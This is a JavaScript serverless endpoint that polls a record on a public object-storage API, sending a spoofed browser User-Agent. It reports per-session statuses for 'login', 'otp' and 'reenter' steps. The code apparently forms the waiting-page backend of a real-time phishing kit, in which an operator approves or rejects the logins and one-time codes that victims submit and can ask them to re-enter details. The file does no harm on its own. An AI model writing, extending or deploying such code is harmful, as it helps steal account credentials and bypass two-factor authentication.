export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const sessionId = req.query.sessionId || req.query.id || '';
  const cloudId = req.query.cloudId || req.query.id || '';
  const phone = req.query.phone || '';
  const targetStep = req.query.targetStep || 'login';

  const targetId = cloudId || sessionId;

  if (!targetId) {
    return res.status(400).json({ error: 'id ou sessionId requis' });
  }

  try {
    const fetchHeaders = {
      'Accept': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    };

    const fetchRes = await fetch(`https://api.restful-api.dev/objects/${targetId}`, {
      headers: fetchHeaders,
      cache: 'no-store',
    });

    if (fetchRes.ok) {
      const record = await fetchRes.json();
      const data = record?.data || {};

      const currentStatus =
        targetStep === 'login'
          ? data.loginStatus || 'pending'
          : targetStep === 'otp'
          ? data.otpStatus || 'idle'
          : data.reenterStatus || 'idle';

      return res.status(200).json({
        exists: true,
        serverWorkerActive: false,
        sessionId: targetId,
        step: targetStep,
        status: currentStatus,
        loginStatus: data.loginStatus || 'pending',
        otpStatus: data.otpStatus || 'idle',
        reenterStatus: data.reenterStatus || 'idle',
        immediate: true,
      });
    }

    // If targetId was not found directly, and was an stl_ session, return pending
    return res.status(200).json({
      exists: false,
      serverWorkerActive: false,
      sessionId: targetId,
      step: targetStep,
      status: 'pending',
      loginStatus: 'pending',
      otpStatus: 'idle',
      reenterStatus: 'idle',
    });
  } catch (error) {
    console.warn('Wait-status lookup error:', error);
    return res.status(200).json({
      exists: false,
      serverWorkerActive: false,
      sessionId: targetId,
      step: targetStep,
      status: 'pending',
      loginStatus: 'pending',
      otpStatus: 'idle',
      reenterStatus: 'idle',
    });
  }
}
